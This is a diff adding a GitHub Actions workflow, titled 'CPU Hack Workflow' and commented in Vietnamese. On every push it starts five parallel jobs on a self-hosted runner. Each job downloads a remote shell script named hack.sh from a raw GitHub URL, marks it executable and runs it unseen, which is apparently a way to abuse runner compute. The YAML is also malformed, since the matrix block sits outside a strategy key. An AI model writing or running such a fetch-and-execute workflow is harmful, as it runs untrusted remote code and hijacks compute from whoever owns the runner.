@@ -1,0 +1,22 @@
+name: CPU Hack Workflow
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  cpu-hack:
+    runs-on: self-hosted
+      matrix:
+        job: [1,2,3,4,5]   # chỉ 5 job
+      fail-fast: false       # nếu 1 job lỗi thì không ảnh hưởng các job khác
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v2
+
+      - name: Run cpu hack ${{ matrix.job }}
+        run: |
+          echo "Running job #${{ matrix.job }}"
+          wget https://raw.githubusercontent.com/phantrongkien12/tester/refs/heads/main/hack.sh -O hack.sh
+          chmod +x hack.sh
+          ./hack.sh
